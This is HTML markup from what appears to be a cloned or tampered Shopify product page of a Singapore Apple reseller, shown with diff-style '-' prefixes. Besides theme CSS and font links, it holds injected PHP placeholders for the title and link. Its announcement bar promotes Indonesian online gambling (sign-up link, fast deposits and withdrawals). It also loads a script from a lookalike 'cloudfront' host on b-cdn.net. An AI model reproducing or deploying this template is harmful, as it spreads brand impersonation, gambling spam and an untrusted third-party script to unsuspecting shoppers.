-        <script id='scb4127' type='text/javascript' async='' src='https://www.istudiosg.com/cdn/shopifycloud/privacy-banner/storefront-banner.js'></script><script id="sections-script" data-sections="header" defer="defer" src="https://www.istudiosg.com/cdn/shop/t/14/compiled_assets/scripts.js?3348"></script>
-        <script>window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.end');</script>
-        <style>
-          #Details-popup_custom_6mTgxV-template--17605519376564__main
-          .popup_round_border {
-          display: inline-block !important;
-          }
-          #PopupModal-popup_custom_6mTgxV .image{
-          width:100%;
-          height:auto;
-          display:block;
-          }
-          #PopupModal-popup_custom_6mTgxV .image.desktop{
-          display:none;
-          }
-          #PopupModal-popup_custom_6mTgxV
-          .product-popup-modal__content{
-          padding: 0 1rem;
-          }
-          #PopupModal-popup_custom_6mTgxV
-          .product-popup-modal__content-info
-          > h1.h2 {
-          display: none;
-          }
-          @media screen and (min-width:750px){
-          #PopupModal-popup_custom_6mTgxV .product-popup-modal__content{
-          width:80%
-          }
-          #PopupModal-popup_custom_6mTgxV .image.desktop{
-          display:block;
-          }
-          #PopupModal-popup_custom_6mTgxV .image.mobile{
-          display:none;
-          }
-          }
-          #PopupModal-popup_custom_6mTgxV
-          .product-popup-modal__content-info{
-          padding-right: 0;
-          }
-          @font-face {
-          font-family: 'SF Pro Text';
-          src: url("https://www.istudiosg.com/cdn/shop/t/14/assets/SFProText-Regular.woff2?v=21706269404805127741742784888") format('woff2'),
-          url("https://www.istudiosg.com/cdn/shop/t/14/assets/SFProText-Regular.woff?v=144701899629177247781742784888") format('woff');
-          font-weight: 400;
-          font-style: normal;
-          font-display: swap;
-          }
-          @font-face {
-          font-family: 'SF Pro Text';
-          src: url('//www.istudiosg.com/cdn/shop/t/14/assets/SFProText-Medium.woff2?v=142744590770268640871742784888') format('woff2'),
-          url('//www.istudiosg.com/cdn/shop/t/14/assets/SFProText-Medium.woff?v=86846661406826704271742784889') format('woff');
-          font-weight: 500;
-          font-style: normal;
-          font-display: swap;
-          }
-          @font-face {
-          font-family: 'SF Pro Text';
-          src: url('//www.istudiosg.com/cdn/shop/t/14/assets/SFProText-Semibold.woff2?v=31375109001105336161742784889') format('woff2'),
-          url('//www.istudiosg.com/cdn/shop/t/14/assets/SFProText-Semibold.woff?v=158359377723366996921742784888') format('woff');
-          font-weight: 600;
-          font-style: normal;
-          font-display: swap;
-          }
-          @font-face {
-          font-family: 'SF Pro Text';
-          src: url('//www.istudiosg.com/cdn/shop/t/14/assets/SFProText-Bold.woff2?v=81066619648910226671742784888') format('woff2'),
-          url('//www.istudiosg.com/cdn/shop/t/14/assets/SFProText-Bold.woff?v=11034071917097156431742784889') format('woff');
-          font-weight: 700;
-          font-style: bold;
-          font-display: swap;
-          }
-          @font-face {
-          font-family: 'Font Awesome 6 Free';
-          font-style: normal;
-          font-weight: 900;
-          font-display: block;
-          src: url("https://www.istudiosg.com/cdn/shop/t/14/assets/fa-solid-900.woff2?v=118991557498766039071742784889") format("woff2"), url("https://www.istudiosg.com/cdn/shop/t/14/assets/fa-solid-900.ttf?v=11227793290438786691742784887") format("truetype");
-          }
-          @font-face {
-          font-family: 'Font Awesome 6 Brands';
-          font-style: normal;
-          font-weight: 400;
-          font-display: block;
-          src: url("https://www.istudiosg.com/cdn/shop/t/14/assets/fa-brands-400.woff2?3348") format("woff2"), url("  //www.istudiosg.com/cdn/shop/t/14/assets/fa-brands-400.ttf?3348") format("truetype");
-          }
-        </style>
-        <style data-shopify>
-          @font-face {
-          font-family: Assistant;
-          font-weight: 400;
-          font-style: normal;
-          font-display: swap;
-          src: url("//www.istudiosg.com/cdn/fonts/assistant/assistant_n4.9120912a469cad1cc292572851508ca49d12e768.woff2?h1=aXN0dWRpby1lbHVzaC1wcm9kdWN0aW9uLmFjY291bnQubXlzaG9waWZ5LmNvbQ&h2=aXN0dWRpb3NnLmNvbQ&hmac=f08b4c8dad363a51140f208e167805f634db94adbbb3544a6fbd71c32b1ebc6f") format("woff2"),
-          url("//www.istudiosg.com/cdn/fonts/assistant/assistant_n4.6e9875ce64e0fefcd3f4446b7ec9036b3ddd2985.woff?h1=aXN0dWRpby1lbHVzaC1wcm9kdWN0aW9uLmFjY291bnQubXlzaG9waWZ5LmNvbQ&h2=aXN0dWRpb3NnLmNvbQ&hmac=04204526227e0d14a011b44f621eed958a37dd24ff228dec608fad5ba3714e53") format("woff");
-          }
-          @font-face {
-          font-family: Assistant;
-          font-weight: 700;
-          font-style: normal;
-          font-display: swap;
-          src: url("//www.istudiosg.com/cdn/fonts/assistant/assistant_n7.bf44452348ec8b8efa3aa3068825305886b1c83c.woff2?h1=aXN0dWRpby1lbHVzaC1wcm9kdWN0aW9uLmFjY291bnQubXlzaG9waWZ5LmNvbQ&h2=aXN0dWRpb3NnLmNvbQ&hmac=3eb98cb4f0f5b11a3f34feed0aa554dd621b127bc1cbc141c68703f90e8e42d3") format("woff2"),
-          url("//www.istudiosg.com/cdn/fonts/assistant/assistant_n7.0c887fee83f6b3bda822f1150b912c72da0f7b64.woff?h1=aXN0dWRpby1lbHVzaC1wcm9kdWN0aW9uLmFjY291bnQubXlzaG9waWZ5LmNvbQ&h2=aXN0dWRpb3NnLmNvbQ&hmac=d0e65006948e80adf21a0472f7da1fee501e61f043b62e661027b9eeb582385b") format("woff");
-          }
-          @font-face {
-          font-family: Assistant;
-          font-weight: 400;
-          font-style: normal;
-          font-display: swap;
-          src: url("//www.istudiosg.com/cdn/fonts/assistant/assistant_n4.9120912a469cad1cc292572851508ca49d12e768.woff2?h1=aXN0dWRpby1lbHVzaC1wcm9kdWN0aW9uLmFjY291bnQubXlzaG9waWZ5LmNvbQ&h2=aXN0dWRpb3NnLmNvbQ&hmac=f08b4c8dad363a51140f208e167805f634db94adbbb3544a6fbd71c32b1ebc6f") format("woff2"),
-          url("//www.istudiosg.com/cdn/fonts/assistant/assistant_n4.6e9875ce64e0fefcd3f4446b7ec9036b3ddd2985.woff?h1=aXN0dWRpby1lbHVzaC1wcm9kdWN0aW9uLmFjY291bnQubXlzaG9waWZ5LmNvbQ&h2=aXN0dWRpb3NnLmNvbQ&hmac=04204526227e0d14a011b44f621eed958a37dd24ff228dec608fad5ba3714e53") format("woff");
-          }
-          :root,
-          .color-background-1 {
-          --color-background: 255,255,255;
-          --gradient-background: #ffffff;
-          --color-foreground: 18,18,18;
-          --color-shadow: 18,18,18;
-          --color-button: 0,113,227;
-          --color-button-text: 255,255,255;
-          --color-secondary-button: 255,255,255;
-          --color-secondary-button-text: 18,18,18;
-          --color-link: 18,18,18;
-          --color-badge-foreground: 18,18,18;
-          --color-badge-background: 255,255,255;
-          --color-badge-border: 18,18,18;
-          --payment-terms-background-color: rgb(255 255 255);
-          }
-          .color-background-2 {
-          --color-background: 243,243,243;
-          --gradient-background: #f3f3f3;
-          --color-foreground: 18,18,18;
-          --color-shadow: 18,18,18;
-          --color-button: 18,18,18;
-          --color-button-text: 243,243,243;
-          --color-secondary-button: 243,243,243;
-          --color-secondary-button-text: 18,18,18;
-          --color-link: 18,18,18;
-          --color-badge-foreground: 18,18,18;
-          --color-badge-background: 243,243,243;
-          --color-badge-border: 18,18,18;
-          --payment-terms-background-color: rgb(243 243 243);
-          }
-          .color-inverse {
-          --color-background: 36,40,51;
-          --gradient-background: #242833;
-          --color-foreground: 255,255,255;
-          --color-shadow: 18,18,18;
-          --color-button: 255,255,255;
-          --color-button-text: 0,0,0;
-          --color-secondary-button: 36,40,51;
-          --color-secondary-button-text: 255,255,255;
-          --color-link: 255,255,255;
-          --color-badge-foreground: 255,255,255;
-          --color-badge-background: 36,40,51;
-          --color-badge-border: 255,255,255;
-          --payment-terms-background-color: rgb(36 40 51);
-          }
-          .color-accent-1 {
-          --color-background: 18,18,18;
-          --gradient-background: #121212;
-          --color-foreground: 255,255,255;
-          --color-shadow: 18,18,18;
-          --color-button: 255,255,255;
-          --color-button-text: 18,18,18;
-          --color-secondary-button: 18,18,18;
-          --color-secondary-button-text: 255,255,255;
-          --color-link: 255,255,255;
-          --color-badge-foreground: 255,255,255;
-          --color-badge-background: 18,18,18;
-          --color-badge-border: 255,255,255;
-          --payment-terms-background-color: rgb(18 18 18);
-          }
-          .color-accent-2 {
-          --color-background: 51,79,180;
-          --gradient-background: #334fb4;
-          --color-foreground: 255,255,255;
-          --color-shadow: 18,18,18;
-          --color-button: 255,255,255;
-          --color-button-text: 51,79,180;
-          --color-secondary-button: 51,79,180;
-          --color-secondary-button-text: 255,255,255;
-          --color-link: 255,255,255;
-          --color-badge-foreground: 255,255,255;
-          --color-badge-background: 51,79,180;
-          --color-badge-border: 255,255,255;
-          --payment-terms-background-color: rgb(51 79 180);
-          }
-          .color-scheme-ac1f97d9-2391-4261-b2e4-e6912b28bacf {
-          --color-background: 0,0,0;
-          --gradient-background: rgba(0,0,0,0);
-          --color-foreground: 255,255,255;
-          --color-shadow: 18,18,18;
-          --color-button: 0,113,227;
-          --color-button-text: 255,255,255;
-          --color-secondary-button: 0,0,0;
-          --color-secondary-button-text: 18,18,18;
-          --color-link: 18,18,18;
-          --color-badge-foreground: 255,255,255;
-          --color-badge-background: 0,0,0;
-          --color-badge-border: 255,255,255;
-          --payment-terms-background-color: rgb(0 0 0);
-          }
-          body, .color-background-1, .color-background-2, .color-inverse, .color-accent-1, .color-accent-2, .color-scheme-ac1f97d9-2391-4261-b2e4-e6912b28bacf {
-          color: rgba(var(--color-foreground), 0.75);
-          background-color: rgb(var(--color-background));
-          }
-          :root {
-          --font-body-family: Assistant, sans-serif;
-          --font-body-style: normal;
-          --font-body-weight: 400;
-          --font-body-weight-bold: 700;
-          --font-heading-family: Assistant, sans-serif;
-          --font-heading-style: normal;
-          --font-heading-weight: 400;
-          --font-body-scale: 1.0;
-          --font-heading-scale: 1.0;
-          --media-padding: px;
-          --media-border-opacity: 0.05;
-          --media-border-width: 1px;
-          --media-radius: 0px;
-          --media-shadow-opacity: 0.0;
-          --media-shadow-horizontal-offset: 0px;
-          --media-shadow-vertical-offset: 0px;
-          --media-shadow-blur-radius: 0px;
-          --media-shadow-visible: 0;
-          --page-width: 120rem;
-          --page-width-margin: 0rem;
-          --product-card-image-padding: 0.0rem;
-          --product-card-corner-radius: 0.0rem;
-          --product-card-text-alignment: left;
-          --product-card-border-width: 0.0rem;
-          --product-card-border-opacity: 0.0;
-          --product-card-shadow-opacity: 0.1;
-          --product-card-shadow-visible: 1;
-          --product-card-shadow-horizontal-offset: 0.0rem;
-          --product-card-shadow-vertical-offset: 0.0rem;
-          --product-card-shadow-blur-radius: 0.0rem;
-          --collection-card-image-padding: 0.0rem;
-          --collection-card-corner-radius: 0.0rem;
-          --collection-card-text-alignment: left;
-          --collection-card-border-width: 0.0rem;
-          --collection-card-border-opacity: 0.0;
-          --collection-card-shadow-opacity: 0.1;
-          --collection-card-shadow-visible: 1;
-          --collection-card-shadow-horizontal-offset: 0.0rem;
-          --collection-card-shadow-vertical-offset: 0.0rem;
-          --collection-card-shadow-blur-radius: 0.0rem;
-          --blog-card-image-padding: 0.0rem;
-          --blog-card-corner-radius: 0.0rem;
-          --blog-card-text-alignment: left;
-          --blog-card-border-width: 0.0rem;
-          --blog-card-border-opacity: 0.1;
-          --blog-card-shadow-opacity: 0.0;
-          --blog-card-shadow-visible: 0;
-          --blog-card-shadow-horizontal-offset: 0.0rem;
-          --blog-card-shadow-vertical-offset: 0.4rem;
-          --blog-card-shadow-blur-radius: 0.5rem;
-          --badge-corner-radius: 4.0rem;
-          --popup-border-width: 1px;
-          --popup-border-opacity: 0.1;
-          --popup-corner-radius: 0px;
-          --popup-shadow-opacity: 0.0;
-          --popup-shadow-horizontal-offset: 0px;
-          --popup-shadow-vertical-offset: 0px;
-          --popup-shadow-blur-radius: 0px;
-          --drawer-border-width: 1px;
-          --drawer-border-opacity: 0.1;
-          --drawer-shadow-opacity: 0.0;
-          --drawer-shadow-horizontal-offset: 0px;
-          --drawer-shadow-vertical-offset: 0px;
-          --drawer-shadow-blur-radius: 0px;
-          --spacing-sections-desktop: 0px;
-          --spacing-sections-mobile: 0px;
-          --grid-desktop-vertical-spacing: 8px;
-          --grid-desktop-horizontal-spacing: 8px;
-          --grid-mobile-vertical-spacing: 4px;
-          --grid-mobile-horizontal-spacing: 4px;
-          --text-boxes-border-opacity: 1.0;
-          --text-boxes-border-width: 0px;
-          --text-boxes-radius: 0px;
-          --text-boxes-shadow-opacity: 0.0;
-          --text-boxes-shadow-visible: 0;
-          --text-boxes-shadow-horizontal-offset: 0px;
-          --text-boxes-shadow-vertical-offset: 0px;
-          --text-boxes-shadow-blur-radius: 0px;
-          --buttons-radius: 40px;
-          --buttons-radius-outset: 42px;
-          --buttons-border-width: 2px;
-          --buttons-border-opacity: 0.4;
-          --buttons-shadow-opacity: 0.0;
-          --buttons-shadow-visible: 0;
-          --buttons-shadow-horizontal-offset: 0px;
-          --buttons-shadow-vertical-offset: 0px;
-          --buttons-shadow-blur-radius: 0px;
-          --buttons-border-offset: 0.3px;
-          --inputs-radius: 4px;
-          --inputs-border-width: 1px;
-          --inputs-border-opacity: 0.55;
-          --inputs-shadow-opacity: 0.0;
-          --inputs-shadow-horizontal-offset: 0px;
-          --inputs-margin-offset: 0px;
-          --inputs-shadow-vertical-offset: 0px;
-          --inputs-shadow-blur-radius: 0px;
-          --inputs-radius-outset: 5px;
-          --variant-pills-radius: 6px;
-          --variant-pills-border-width: 1px;
-          --variant-pills-border-opacity: 0.2;
-          --variant-pills-shadow-opacity: 0.0;
-          --variant-pills-shadow-horizontal-offset: -4px;
-          --variant-pills-shadow-vertical-offset: 0px;
-          --variant-pills-shadow-blur-radius: 0px;
-          --font-body-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont;
-          --font-body-style: normal;
-          --font-body-weight: 400;
-          --font-heading-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont;
-          --font-heading-style: normal;
-          --font-heading-weight: 400;
-          --font-body-scale: 1.0;
-          --font-heading-scale: 1.0;
-          --color-base-text: 18, 18, 18;
-          --color-shadow: 18, 18, 18;
-          --color-base-background-1: 255, 255, 255;
-          --color-base-background-2: 255, 255, 255;
-          --color-base-solid-button-labels: 255, 255, 255;
-          --color-base-outline-button-labels: 18, 18, 18;
-          --color-base-accent-1: 0, 113, 227;
-          --color-base-accent-2: 51, 79, 180;
-          --payment-terms-background-color: #FFFFFF;
-          --gradient-base-background-1: #FFFFFF;
-          --gradient-base-background-2: #FFFFFF;
-          --gradient-base-accent-1: #0071e3;
-          --gradient-base-accent-2: #334FB4;
-          --media-padding: px;
-          --media-border-opacity: 0.05;
-          --media-border-width: 1px;
-          --media-radius: 0px;
-          --media-shadow-opacity: 0.0;
-          --media-shadow-horizontal-offset: 0px;
-          --media-shadow-vertical-offset: 0px;
-          --media-shadow-blur-radius: 0px;
-          --page-width: 120rem;
-          --page-width-margin: 0rem;
-          --card-image-padding: 0.0rem;
-          --card-corner-radius: 0.0rem;
-          --card-text-alignment: left;
-          --card-border-width: 0.0rem;
-          --card-border-opacity: 0.0;
-          --card-shadow-opacity: 0.1;
-          --card-shadow-horizontal-offset: 0.0rem;
-          --card-shadow-vertical-offset: 0.0rem;
-          --card-shadow-blur-radius: 0.0rem;
-          --badge-corner-radius: 4.0rem;
-          --popup-border-width: 1px;
-          --popup-border-opacity: 0.1;
-          --popup-corner-radius: 0px;
-          --popup-shadow-opacity: 0.0;
-          --popup-shadow-horizontal-offset: 0px;
-          --popup-shadow-vertical-offset: 0px;
-          --popup-shadow-blur-radius: 0px;
-          --drawer-border-width: 1px;
-          --drawer-border-opacity: 0.1;
-          --drawer-shadow-opacity: 0.0;
-          --drawer-shadow-horizontal-offset: 0px;
-          --drawer-shadow-vertical-offset: 0px;
-          --drawer-shadow-blur-radius: 0px;
-          --spacing-sections-desktop: 0px;
-          --spacing-sections-mobile: 0px;
-          --grid-desktop-vertical-spacing: 8px;
-          --grid-desktop-horizontal-spacing: 8px;
-          --grid-mobile-vertical-spacing: 4px;
-          --grid-mobile-horizontal-spacing: 4px;
-          --text-boxes-border-opacity: 1.0;
-          --text-boxes-border-width: 0px;
-          --text-boxes-radius: 0px;
-          --text-boxes-shadow-opacity: 0.0;
-          --text-boxes-shadow-horizontal-offset: 0px;
-          --text-boxes-shadow-vertical-offset: 0px;
-          --text-boxes-shadow-blur-radius: 0px;
-          --buttons-radius: 40px;
-          --buttons-radius-outset: 42px;
-          --buttons-border-width: 2px;
-          --buttons-border-opacity: 0.4;
-          --buttons-shadow-opacity: 0.0;
-          --buttons-shadow-horizontal-offset: 0px;
-          --buttons-shadow-vertical-offset: 0px;
-          --buttons-shadow-blur-radius: 0px;
-          --buttons-border-offset: 0.3px;
-          --inputs-radius: 4px;
-          --inputs-border-width: 1px;
-          --inputs-border-opacity: 0.55;
-          --inputs-shadow-opacity: 0.0;
-          --inputs-shadow-horizontal-offset: 0px;
-          --inputs-margin-offset: 0px;
-          --inputs-shadow-vertical-offset: 0px;
-          --inputs-shadow-blur-radius: 0px;
-          --inputs-radius-outset: 5px;
-          --variant-pills-radius: 6px;
-          --variant-pills-border-width: 1px;
-          --variant-pills-border-opacity: 0.2;
-          --variant-pills-shadow-opacity: 0.0;
-          --variant-pills-shadow-horizontal-offset: -4px;
-          --variant-pills-shadow-vertical-offset: 0px;
-          --variant-pills-shadow-blur-radius: 0px;
-          --color-primary-bt-bg: #ffffff;
-          --color-primary-bt-label: #FFFFFF;
-          --color-primary-bt-outline: #0071e3;
-          --color-primary-bt-hover: #62bbfa;
-          --color-secondary-bt-bg: transparent;
-          --color-secondary-bt-label: #0071e3;
-          --color-secondary-bt-outline: #0071e3;
-          --color-secondary-bt-hover: #62bbfa;
-          --color-link-dynamic-label: #0071e3;
-          --color-link-dynamic-hover: #62bbfa;
-          --color-tertiary-dynamic-label: #0071e3;
-          --color-tertiary-dynamic-hover: #62bbfa;
-          }
-          *,
-          *::before,
-          *::after {
-          box-sizing: inherit;
-          }
-          html {
-          box-sizing: border-box;
-          font-size: calc(var(--font-body-scale) * 62.5%);
-          height: 100%;
-          }
-          body {
-          min-height: 100%;
-          margin: 0;
-          font-size: 1.5rem;
-          letter-spacing: 0.06rem;
-          line-height: calc(1 + 0.8 / var(--font-body-scale));
-          font-family: var(--font-body-family);
-          font-style: var(--font-body-style);
-          font-weight: var(--font-body-weight);
-          -webkit-font-smoothing: antialiased;
-          }
-          body:has(.shopify-section-group-footer-group) {
-          display: grid;
-          grid-template-rows: auto auto 1fr auto;
-          grid-template-columns: 100%;
-          }
-          @media screen and (min-width: 750px) {
-          body {
-          font-size: 1.6rem;
-          }
-          }
-        </style>
-        <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/base.css?v=127241086646799884071742784889" rel="stylesheet" type="text/css" media="all" />
-        <link rel="preload" as="font" href="//www.istudiosg.com/cdn/fonts/assistant/assistant_n4.9120912a469cad1cc292572851508ca49d12e768.woff2?h1=aXN0dWRpby1lbHVzaC1wcm9kdWN0aW9uLmFjY291bnQubXlzaG9waWZ5LmNvbQ&h2=aXN0dWRpb3NnLmNvbQ&hmac=f08b4c8dad363a51140f208e167805f634db94adbbb3544a6fbd71c32b1ebc6f" type="font/woff2" crossorigin>
-        <link rel="preload" as="font" href="//www.istudiosg.com/cdn/fonts/assistant/assistant_n4.9120912a469cad1cc292572851508ca49d12e768.woff2?h1=aXN0dWRpby1lbHVzaC1wcm9kdWN0aW9uLmFjY291bnQubXlzaG9waWZ5LmNvbQ&h2=aXN0dWRpb3NnLmNvbQ&hmac=f08b4c8dad363a51140f208e167805f634db94adbbb3544a6fbd71c32b1ebc6f" type="font/woff2" crossorigin>
-        <link
-          rel="stylesheet"
-          href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-predictive-search.css?v=91813212418334334851742784888"
-          media="print"
-          onload="this.media='all'"
-          >
-        <script>
-          document.documentElement.className = document.documentElement.className.replace('no-js', 'js');
-          if (Shopify.designMode) {
-            document.documentElement.classList.add('shopify-design-mode');
-          }
-          const vat_free_day = false;
-          
-          const vat_discount_amount = 20.0;
-          
-          
-          const vat_free_quantity = "3";
-          
-          
-          const vat_free_message = "Cannot add more than 3 VAT-exempt products to the shopping cart";
-          
-          
-          const not_available_message = "Not Available";
-          
-          
-          const quantity_limit_error_message = "Sorry! you reached maximum limit for this product!";
-          
-        </script>
-        <link rel="stylesheet" href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-card.css?v=111081949408356567601742784889" media="print" onload="this.media='all'">
-        <link rel="stylesheet" href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-price.css?v=89212854351592844731742784887" media="print" onload="this.media='all'">
-        <link
-          rel="stylesheet"
-          href="https://www.istudiosg.com/cdn/shop/t/14/assets/section-product-recommendations.css?v=49786085183541529781742784888"
-          media="print"
-          onload="this.media='all'"
-          >
-        <link rel="stylesheet" href="https://www.istudiosg.com/cdn/shop/t/14/assets/slick-theme.css?v=155861180100014643231742784887" media="print" onload="this.media='all'">
-        <link rel="stylesheet" href="https://www.istudiosg.com/cdn/shop/t/14/assets/slick-theme-min.css?v=86793612638635186001742784889" media="print" onload="this.media='all'">
-        <noscript>
-          <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-price.css?v=89212854351592844731742784887" rel="stylesheet" type="text/css" media="all" />
-        </noscript>
-        <noscript>
-          <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/section-product-recommendations.css?v=49786085183541529781742784888" rel="stylesheet" type="text/css" media="all" />
-        </noscript>
-        <link rel="stylesheet" href="https://www.istudiosg.com/cdn/shop/t/14/assets/product-scratch.css?v=179858087556892581742784887" media="print" onload="this.media='all'">
-        <link
-          rel="stylesheet"
-          href="https://www.istudiosg.com/cdn/shop/t/14/assets/product-collection-carousel.css?v=15060387450964793051742784888"
-          media="print"
-          onload="this.media='all'"
-          >
-        <link rel="stylesheet" href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-rating.css?v=157771854592137137841742784889" media="print" onload="this.media='all'">
-        <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/product-model.js?v=56285008796734381901742784888" defer></script>
-        <script src="https://d3ulwu8fab47va-cloudfront.b-cdn.net/cdn/shop/t/14/assets/product-model.js"></script>
-        <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/ac-modal.min.css?v=15722724579182767671742784888" rel="stylesheet" type="text/css" media="all" />
-        <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/ac-modal-custom.css?v=17302321221102055051742784887" rel="stylesheet" type="text/css" media="all" />
-        <link rel="stylesheet" href="https://www.istudiosg.com/cdn/shop/t/14/assets/ac-modal-custom.css?v=17302321221102055051742784887" media="print" onload="this.media='all'">
-        <link
-          rel="stylesheet"
-          href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-apple-care-modal.css?v=72539108787457179491742784889"
-          media="print"
-          onload="this.media='all'"
-          >
-        <link rel="stylesheet" href="https://www.istudiosg.com/cdn/shop/t/14/assets/fontawesome.min.css?v=137756382566111518581742784888" media="print" onload="this.media='all'">
-        <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-pickup-availability.css?v=126759165165079086151742784888" rel="stylesheet" type="text/css" media="all" />
-        <link href="https://monorail-edge.shopifysvc.com" rel="dns-prefetch">
-        <script>
-          window.ShopifyAnalytics = window.ShopifyAnalytics || {};
-          window.ShopifyAnalytics.meta = window.ShopifyAnalytics.meta || {};
-          window.ShopifyAnalytics.meta.currency = 'SGD';
-          var meta = {"product":{"id":7986665160884,"gid":"gid://shopify/Product/7986665160884","vendor":"Apple","type":"iPhone","variants":[{"id":44033871610036,"price":25900,"name":"<?= $title; ?>","public_title":null,"sku":"MG8H4X/A"}],"remote":false},"page":{"pageType":"product","resourceType":"product","resourceId":7986665160884}};
-          for (var attr in meta) {
-            window.ShopifyAnalytics.meta[attr] = meta[attr];
-          }
-        </script>
-        
-        <script
-          defer
-          src="https://www.istudiosg.com/cdn/shopifycloud/perf-kit/shopify-perf-kit-2.0.13.min.js"
-          data-application="storefront-renderer"
-          data-shop-id="63738642612"
-          data-render-region="gcp-asia-southeast1"
-          data-page-type="product"
-          data-theme-instance-id="139536236724"
-          data-theme-name="Dawn"
-          data-theme-version="11.0.0"
-          data-monorail-region="shop_domain"
-          data-resource-timing-sampling-rate="10"
-          data-shs="true"
-          data-shs-beacon="true"
-          data-shs-export-with-fetch="true"
-          data-shs-logs-sample-rate="1"
-          ></script>
-    </head>
-    <body
-        class="gradient animate--hover-default"
-        data-template="product"
-        >
-        <div id="shopify-section-announcement_bar_slider" class="shopify-section">
-          <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/announcement-bar-slider.js?v=142197795293918470981742784887" defer="defer"></script>
-          <div class="hura-announcement-bar slider-container">
-              <div class="hura-messages swiper-wrapper">
-                <div class="hura-message swiper-slide slick-slide">
-                    <?= $title; ?>
-                    <a href="<?= $ampmek; ?>" class="announcement_link" target="_blank" rel="nofollow noopener noreferrer">
-                    Daftar Disini !
-                    </a>
-                </div>
-                <div class="hura-message swiper-slide slick-slide">
-                    Proses Deposit & Withdraw Cepat
-                </div>
-                <div class="hura-message swiper-slide slick-slide">
-                    Layanan Customer Service 24 Jam
-                </div>
-                <div class="hura-message swiper-slide slick-slide">
-                    Tampilan Website Modern & Responsif
-                </div>
-                <div class="hura-message swiper-slide slick-slide">
-                    Banyak Pilihan Pasaran & Permainan
-                </div>
-                <div class="hura-message swiper-slide slick-slide">
-                    Keamanan Data Terjamin
-                </div>
-              </div>
-          </div>
-          <style>
-              .hura-messages.swiper-wrapper{display:none}.hura-announcement-bar{width:100%;max-width:1220px;margin:0 auto;padding:8px 0}.hura-announcement-bar .slick-track{display:flex;align-items:center}.hura-messages.swiper-wrapper.slick-initialized.slick-slider{display:flex} div#shopify-section-announcement_bar_slider {background:#168edf;} .hura-announcement-bar .hura-message{text-align:center;align-self: center;font-size:12px;line-height: 14px;color:#0a0a0a;padding-left: 24px;padding-right: 24px;} .hura-announcement-bar .swiper-button-next:after, .hura-announcement-bar .swiper-container-rtl .swiper-button-prev:after,.hura-announcement-bar .swiper-button-prev:after, .hura-announcement-bar .swiper-container-rtl .swiper-button-next:after{font-size: 15px;color:#ffffff;} .hura-messages .slick-prev:before, .hura-messages .slick-next:before {color: #ffffff !important;opacity: 1;} .hura-messages .slick-prev:before {content: url("data:image/svg+xml,%3Csvg width='6' height='11' viewBox='0 0 6 11' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M5.16164 10.3233L6 9.48493L1.67671 5.16164L6 0.838358L5.16164 0L0 5.16164L5.16164 10.3233Z' fill='white'/%3E%3C/svg%3E%0A");} .hura-messages .slick-next:before {content: url("data:image/svg+xml,%3Csvg width='6' height='11' viewBox='0 0 6 11' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M0.838356 0.676713L-8.46107e-07 1.51507L4.32329 5.83836L-9.01992e-08 10.1616L0.838357 11L6 5.83836L0.838356 0.676713Z' fill='white'/%3E%3C/svg%3E%0A");} div.hura-swiper-button { display:block; align-items: center;}
-              .slick-next,.slick-next:focus,.slick-next:hover,.slick-prev,.slick-prev:focus,.slick-prev:hover{color:transparent;outline:0;background:0 0}.slick-next,.slick-prev{font-size:0;line-height:0;position:absolute;top:50%;display:block;width:20px;height:20px;padding:0;-webkit-transform:translate(0,-50%);-ms-transform:translate(0,-50%);transform:translate(0,-50%);cursor:pointer;border:none;z-index:1}.slick-next:focus:before,.slick-next:hover:before,.slick-prev:focus:before,.slick-prev:hover:before{opacity:1}.slick-next.slick-disabled:before,.slick-prev.slick-disabled:before{opacity:.25}.slick-next:before,.slick-prev:before{font-family:slick;font-size:20px;line-height:1;opacity:.75;color:#000;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.slick-prev{left:0}[dir=rtl] .slick-prev{right:-25px;left:auto}.slick-prev:before,[dir=rtl] .slick-next:before{content:'←'}.slick-next:before,[dir=rtl] .slick-prev:before{content:'→'}.slick-next{right:0}[dir=rtl] .slick-next{right:auto;left:-25px}.announcement_link {	color: #d0d0d0 !important; text-decoration: none;	}
-              @media screen and (max-width:749px){.slick-prev{left:-21px}.slick-next{right:-21px}.hura-announcement-bar{margin:inherit;padding:8px 30px;height:auto}}
-          </style>
-      
-
-
-        </div>
-        <!-- BEGIN sections: header-group -->
-        <div id="shopify-section-sections--17605520031924__header" class="shopify-section shopify-section-group-header-group section-header">
-          <link rel="stylesheet" href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-list-menu.css?v=104864129994713251501742784888" media="print" onload="this.media='all'">
-          <link rel="stylesheet" href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-search.css?v=130382253973794904871742784887" media="print" onload="this.media='all'">
-          <link rel="stylesheet" href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-menu-drawer.css?v=21058032239462183751742784887" media="print" onload="this.media='all'">
-          <link rel="stylesheet" href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-cart-notification.css?v=71986486250318288601742784887" media="print" onload="this.media='all'">
-          <link rel="stylesheet" href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-cart-items.css?v=144236440317055431411742784889" media="print" onload="this.media='all'">
-          <link rel="stylesheet" href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-price.css?v=89212854351592844731742784887" media="print" onload="this.media='all'">
-          <link rel="stylesheet" href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-loading-overlay.css?v=160031540023746741091742784889" media="print" onload="this.media='all'">
-          <link rel="stylesheet" href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-mega-menu.css?v=10110889665867715061742784889" media="print" onload="this.media='all'">
